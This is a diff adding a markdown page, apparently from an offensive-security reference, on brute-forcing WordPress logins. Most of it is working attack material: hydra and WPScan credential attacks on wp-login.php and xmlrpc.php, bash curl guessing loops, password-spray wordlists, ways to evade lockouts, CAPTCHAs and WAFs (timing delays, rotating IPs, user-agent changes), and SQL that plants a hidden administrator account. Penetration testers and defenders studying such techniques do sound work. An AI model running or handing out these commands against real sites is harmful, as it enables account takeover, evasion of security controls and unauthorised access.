@@ -1,0 +1,333 @@
+---
+title: Login Brute-Force
+description: Brute-forcing WordPress credentials - the wp-login.php form path vs the xmlrpc.php API path, WPScan's password-attack mode, hydra's wordpress module, and detection-aware patterns including password spray and slowdowns to evade lockouts.
+mitre: [T1110, T1110.001, T1110.003, T1078]
+d3fend: [D3-MFA]
+impact: [CredentialTheft, AuthBypass]
+sidebar:
+  order: 7
+  label: Login Brute-Force
+---
+
+## TL;DR
+
+Brute-forcing WordPress credentials with a user list (from [User Enumeration](/codex/web/wordpress/user-enumeration/)) is one of the most reliable paths to admin access on the public web. Two attack endpoints; one heavily monitored, one often not:
+
+```
+# wp-login.php - the form-based login (rate-limited on hardened sites)
+hydra -L users.txt -P passwords.txt http-post-form \
+  '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=is incorrect' target.com
+
+# xmlrpc.php - the API path (often not rate-limited)
+wpscan --url http://target --password-attack xmlrpc -U admin -P passwords.txt -t 20
+
+# Spray (one common password across many users - defeats per-user lockouts)
+wpscan --url http://target --password-attack xmlrpc -U users.txt -P single_pass.txt
+```
+
+Success indicator: a confirmed `<user>:<password>` pair that you can then use to log into `wp-admin` and proceed to RCE.
+
+## Two attack endpoints
+
+WordPress accepts authentication on (at least) two endpoints. They have substantially different operational characteristics:
+
+| Aspect | `wp-login.php` | `xmlrpc.php` |
+| --- | --- | --- |
+| Protocol | HTML form POST | XML-RPC method call |
+| Rate limiting (default) | None core; many plugins add it | None core; some plugins add it |
+| CAPTCHA support | Common via plugins | Rare |
+| Audit logging | Heavily logged on hardened sites | Less commonly monitored |
+| Speed per request | Slow (synchronous WP bootstrap) | Slightly faster (different bootstrap path) |
+| Speed per HTTP request | 1 attempt | Up to ~150 via `system.multicall` |
+| Often disabled? | No (would break user login) | Yes (via Wordfence, iThemes, etc.) |
+| Differential error responses | Yes (user-exists vs password-wrong) by default | Yes (faultString) |
+
+The operational implication: when both endpoints are reachable, `xmlrpc.php` is usually the right choice. When only `wp-login.php` is reachable (xmlrpc disabled), use the form path but accept the noise.
+
+## wp-login.php form mechanics
+
+The login form submits to `wp-login.php` itself with these parameters:
+
+```
+POST /wp-login.php HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+log=admin&pwd=password&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1
+```
+
+Key fields:
+
+- `log` - username
+- `pwd` - password
+- `wp-submit` - the submit button name (`Log In`)
+- `redirect_to` - where to send the user after success
+- `testcookie` - set by WordPress to check the browser accepts cookies; must be `1`
+
+A successful login returns a 302 redirect to `redirect_to` (default `/wp-admin/`) with `wordpress_logged_in_*` cookies set. A failed login returns a 200 OK with the login form re-rendered and an error message.
+
+### Reading the response
+
+Differential markers in the response body:
+
+| Body contains | Meaning |
+| --- | --- |
+| `is not registered on this site` | Username doesn't exist |
+| `The password you entered for the username` | Username exists, password wrong |
+| `is incorrect` (alone, in a generic error) | Hardened error - could be either |
+| (No login form, no error) | Login succeeded - the 302 redirect happened |
+
+For Hydra and similar tools, the failure marker is `is incorrect`:
+
+```shell
+hydra -L users.txt -P passwords.txt -V \
+  http-post-form 'target.com:/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=is incorrect'
+```
+
+`-V` shows each attempt. The `:F=` parameter is the failure marker - Hydra treats any response *not* containing this string as success. Tune the marker to whatever error string the target actually returns; some hardened installs return generic `password you entered is incorrect` for both invalid-user and invalid-password cases.
+
+### Cookie / nonce handling
+
+WordPress sets a `wordpress_test_cookie` on initial visit and the form submission can optionally include nonces. For modern WordPress, basic form submission without these still works - the test cookie is set client-side and the form post-back includes it via the user's browser, but bare-metal HTTP clients can submit without it.
+
+When a target's `wp-login.php` is hardened with a custom plugin (e.g., requires a CAPTCHA, a hidden field timestamp, or a custom nonce), the simple Hydra approach fails. Workarounds:
+
+- Burp Intruder with session-handling rules that fetch the form first, extract nonces, and reuse them
+- A custom script using `requests` (Python) or similar that handles the session
+
+For most targets without those defenses, the simple form submission works.
+
+## xmlrpc.php brute-force mechanics
+
+The `xmlrpc.php` brute-force uses `wp.getUsersBlogs` as the credential-validation primitive. See [XML-RPC abuse](/codex/web/wordpress/xmlrpc-abuse/) for the protocol details.
+
+### WPScan's xmlrpc mode
+
+```shell
+wpscan --password-attack xmlrpc \
+  --url http://target/ \
+  -U admin,david,roger \
+  -P /usr/share/wordlists/rockyou.txt \
+  -t 20
+```
+
+Key flags:
+
+- `--password-attack xmlrpc` - use the xmlrpc.php path
+- `--password-attack wp-login` - use wp-login.php (default for older WPScan versions)
+- `-U user1,user2,...` - username list (comma-separated or `@filename`)
+- `-P /path/to/wordlist` - password wordlist
+- `-t 20` - threads (default 5; up to 30 is reasonable; higher invites rate-limit responses)
+
+Output for a hit:
+
+```
+[+] Performing password attack on Xmlrpc against 3 user/s
+
+[SUCCESS] - admin / sunshine1
+Trying david / Spring2016  Time: 00:00:01 <==========> (474 / 474) 100.00% Time: 00:00:01
+
+[i] Valid Combinations Found:
+ | Username: admin, Password: sunshine1
+```
+
+### Manual xmlrpc brute-force loop
+
+Without WPScan, plain curl in a loop:
+
+```shell
+USERS="admin david roger erika"
+while read pass; do
+  for user in $USERS; do
+    resp=$(curl -s -X POST -d "<?xml version='1.0'?>
+<methodCall><methodName>wp.getUsersBlogs</methodName>
+<params><param><value>${user}</value></param><param><value>${pass}</value></param></params>
+</methodCall>" http://target/xmlrpc.php)
+    if echo "$resp" | grep -q '<isAdmin>'; then
+      echo "FOUND: $user / $pass"
+    fi
+  done
+done < passwords.txt
+```
+
+This is slower than WPScan but works when WPScan isn't available or when you need to customize the payload (e.g., to bypass a WAF that's specifically pattern-matching WPScan).
+
+### system.multicall amplification
+
+To submit hundreds of attempts in one HTTP request, build a multicall payload (see [XML-RPC abuse](/codex/web/wordpress/xmlrpc-abuse/) for the structure). WPScan does this internally when threads are high and the wordlist is large; manually, it's a bigger payload to construct.
+
+Practical caveat: WordPress 4.4+ limits multicall to ~150 calls per request. Older installs accept much more.
+
+## Hydra wordpress module
+
+Hydra supports HTTP form auth directly:
+
+```shell
+hydra -L users.txt -P passwords.txt -t 4 -f -V \
+  target.com http-post-form \
+  '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=is incorrect'
+```
+
+Flags:
+
+- `-L` username file (lowercase = list)
+- `-P` password file
+- `-t 4` four parallel threads
+- `-f` stop on first found credential
+- `-V` verbose
+
+For HTTPS targets:
+
+```shell
+hydra -L users.txt -P passwords.txt -t 4 -f -V \
+  target.com https-post-form \
+  '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=is incorrect'
+```
+
+The `^USER^` and `^PASS^` placeholders are Hydra's variable syntax.
+
+## Password spray
+
+Brute-force with many passwords per user invites per-user account lockout. Spray with one password across many users instead:
+
+```shell
+wpscan --url http://target/ --password-attack xmlrpc \
+  -U users.txt -P single_password.txt -t 10
+```
+
+Where `single_password.txt` contains exactly one line like `Spring2024!`. The result: each user gets exactly one login attempt. No per-user lockout trips.
+
+Common patterns to spray, in order of historical success rate:
+
+```
+Welcome1
+Welcome123
+Spring2024
+Spring2024!
+Summer2024!
+Password1
+Password123!
+<CompanyName>2024
+<CompanyName>2024!
+<CompanyName>123
+```
+
+Replace `<CompanyName>` with the target's name. Many targets use a "default new-user password" that's a hardcoded template; the company name is almost always part of it.
+
+When a spray succeeds, the user whose password happens to be the spray target may be an unexpected role (Subscriber, Editor) - not always the admin. But any logged-in identity is useful - Authors and above can upload media, Editors can edit posts, and the [admin-to-RCE chain](/codex/web/wordpress/admin-to-rce/) sometimes works from non-admin roles too.
+
+### Time-spread spray
+
+To evade lockouts that are based on per-source-IP attempt rate:
+
+```shell
+for user in $(cat users.txt); do
+  sleep $((RANDOM % 30 + 30))    # 30-60s between attempts
+  curl -s -X POST -d "<?xml version='1.0'?>
+<methodCall><methodName>wp.getUsersBlogs</methodName>
+<params><param><value>${user}</value></param><param><value>Spring2024!</value></param></params>
+</methodCall>" http://target/xmlrpc.php | grep -qE '<isAdmin>' && echo "FOUND: $user"
+done
+```
+
+Trade time for stealth. A 30-60s delay between attempts looks like normal user activity in the source IP's connection log.
+
+## Lockout-aware patterns
+
+Common lockout configurations and how to handle them:
+
+### Per-user lockout (e.g., iThemes Security default: 5 failed attempts in 5 minutes → lock for 15 minutes)
+
+- Spray rather than brute-force (one attempt per user, no lockout)
+- If brute-forcing one specific user, throttle to under 5 attempts per 5 minutes
+- Switch users frequently - never hammer one account
+
+### Per-IP lockout (e.g., Wordfence "Block IP for 5 minutes after 20 failed login attempts")
+
+- Time-spread (spread attempts over the lockout window)
+- Use multiple source IPs (proxies, cloud rotating IPs)
+- Switch to `xmlrpc.php` if the lockout is `wp-login.php`-only (and vice versa)
+
+### CAPTCHA on N-th failure
+
+- Some plugins (Google reCAPTCHA, hCaptcha integrated plugins) add a CAPTCHA after the first failure. Manual completion of CAPTCHA defeats brute-force entirely for that source.
+- Switch to `xmlrpc.php` which typically lacks CAPTCHA integration.
+
+### Cloudflare or WAF in front
+
+- Pattern detection on request bodies (e.g., requests with `pwd=` and `wp-submit=` are flagged)
+- Often catches WPScan's default user-agent
+- Workarounds: change user-agent (`wpscan --user-agent "..."`), randomize request timing, slow down
+
+## Validating found credentials
+
+Once a brute-force result claims success, verify by attempting an actual login:
+
+```shell
+# Get the auth cookie
+curl -i -c cookies.txt -X POST -d 'log=admin&pwd=sunshine1&wp-submit=Log+In' \
+  http://target/wp-login.php
+
+# Check for wordpress_logged_in_* cookie in the response
+grep wordpress_logged_in cookies.txt
+```
+
+```
+target.com  FALSE  /  TRUE  0  wordpress_logged_in_<hash>  admin|1234567890|...|...
+```
+
+If `wordpress_logged_in_<hash>` is set, login succeeded. Use the cookies file with subsequent curl calls:
+
+```shell
+curl -b cookies.txt http://target/wp-admin/
+# Should return the dashboard HTML, not a redirect to wp-login.php
+```
+
+If the response is a redirect to `wp-login.php`, the brute-force "success" was a false positive - sometimes happens with hardened error pages that fool Hydra's failure marker.
+
+## Direct admin user creation via SQL
+
+When you have SQL-injection access to the WP database (via a vulnerable plugin's SQLi - see [Vulnerable Plugins](/codex/web/wordpress/vulnerable-plugins/) or [SQL Injection cluster](/codex/web/sqli/)), you can skip the brute-force and just insert an admin user:
+
+```sql
+-- WordPress password hash format: phpass-portable, ~60 chars
+-- The hash below is for "Password123!"
+INSERT INTO wp_users (user_login, user_pass, user_email, user_registered, display_name)
+VALUES ('attacker', '$P$BFqBfvWtsHHGzVKVR2KvI6Js2gMQ4Q.', 'a@a.com', NOW(), 'attacker');
+
+-- Get the user ID
+-- Then grant admin role:
+INSERT INTO wp_usermeta (user_id, meta_key, meta_value)
+VALUES (LAST_INSERT_ID(), 'wp_capabilities', 'a:1:{s:13:"administrator";b:1;}');
+
+INSERT INTO wp_usermeta (user_id, meta_key, meta_value)
+VALUES (LAST_INSERT_ID(), 'wp_user_level', '10');
+```
+
+`wp_capabilities` with the serialized PHP value `a:1:{s:13:"administrator";b:1;}` makes the user an administrator. The `wp_user_level` `10` is the legacy numeric privilege level (10 = administrator).
+
+After this, log in with `attacker`:`Password123!`. From there, the [admin-to-RCE chain](/codex/web/wordpress/admin-to-rce/).
+
+To generate a phpass hash for an arbitrary password:
+
+```shell
+# Using a small PHP script
+echo "<?php require 'wp-includes/class-phpass.php'; \$hasher = new PasswordHash(8, true); echo \$hasher->HashPassword('MyPassword') . PHP_EOL;" > hash.php
+php hash.php
+
+# Or with Python phpass library
+python3 -c "from phpass import PasswordHash; ph = PasswordHash(8, True); print(ph.hash_password(b'MyPassword').decode())"
+```
+
+## Quick reference
+
+| Task | Command |
+| --- | --- |
+| Hydra wp-login | `hydra -L users -P pass target http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=is incorrect'` |
+| WPScan xmlrpc | `wpscan --url URL --password-attack xmlrpc -U USERS -P PASS -t 20` |
+| WPScan wp-login | `wpscan --url URL --password-attack wp-login -U USERS -P PASS -t 20` |
+| Single-pass spray | `wpscan --url URL --password-attack xmlrpc -U USERS -P single.txt` |
+| Manual xmlrpc loop | bash with curl + `wp.getUsersBlogs` body |
+| Verify creds | `curl -i -c cookies.txt -X POST -d 'log=USER&pwd=PASS&wp-submit=Log+In' http://target/wp-login.php` |
+| Check verified login | `curl -b cookies.txt http://target/wp-admin/` (expect dashboard, not redirect) |
+| Time-spread spray | bash loop with `sleep $((RANDOM % 30 + 30))` |
+| Generate phpass hash | `php -r "require 'class-phpass.php'; \$h=new PasswordHash(8,true); echo \$h->HashPassword('pw');"` |
